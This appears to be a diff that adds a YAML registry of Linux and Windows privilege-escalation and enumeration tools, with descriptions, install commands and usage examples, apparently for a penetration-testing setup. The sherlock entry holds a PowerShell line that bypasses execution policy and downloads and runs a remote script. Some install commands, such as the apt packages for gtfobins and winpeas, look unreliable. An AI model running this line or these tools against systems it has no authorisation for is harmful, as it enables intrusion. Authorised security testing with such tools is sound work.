@@ -1,0 +1,60 @@
+linpeas:
+  description: "Linux Privilege Escalation Awesome Script - comprehensive local privilege escalation audit"
+  category: "enumeration"
+  install_cmd: "apt-get install -y linpeas"
+  verify_cmd: "which linpeas"
+  examples:
+    - "./linpeas.sh"
+    - "./linpeas.sh -a"
+
+winpeas:
+  description: "Windows Privilege Escalation Awesome Script - Windows local privilege escalation audit"
+  category: "enumeration"
+  install_cmd: "apt-get install -y winpeas"
+  verify_cmd: "which winpeas"
+  examples:
+    - "./winpeas.exe"
+
+linux-exploit-suggester:
+  description: "Suggests potential kernel exploits based on kernel version"
+  category: "exploitation"
+  install_cmd: "apt-get install -y linux-exploit-suggester"
+  verify_cmd: "which linux-exploit-suggester"
+  examples:
+    - "./linux-exploit-suggester.sh"
+    - "./linux-exploit-suggester.sh -k 4.4.0"
+
+sherlock:
+  description: "PowerShell script to find missing software patches for local privilege escalation vulnerabilities"
+  category: "enumeration"
+  install_cmd: "apt-get install -y sherlock"
+  verify_cmd: "which sherlock"
+  examples:
+    - "powershell.exe -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://target/sherlock.ps1'); Sherlock\""
+
+gtfobins:
+  description: "GTFOBins - Unix binaries that can be exploited to bypass security restrictions"
+  category: "exploitation"
+  install_cmd: "apt-get install -y gtfobins"
+  verify_cmd: "which gtfobins"
+  examples:
+    - "gtfobins sudo"  # Check sudo exploitation options
+    - "gtfobins tar"   # Check tar exploitation options
+
+lse:
+  description: "Linux Smart Enumeration - enumeration with smart detection of security issues"
+  category: "enumeration"
+  install_cmd: "apt-get install -y lse"
+  verify_cmd: "which lse"
+  examples:
+    - "./lse.sh"
+    - "./lse.sh -l 1"
+
+pspy:
+  description: "Monitor processes without root permissions - useful for cron job monitoring"
+  category: "enumeration"
+  install_cmd: "apt-get install -y pspy"
+  verify_cmd: "which pspy"
+  examples:
+    - "./pspy64"
+    - "./pspy64 -pf -i 1000"
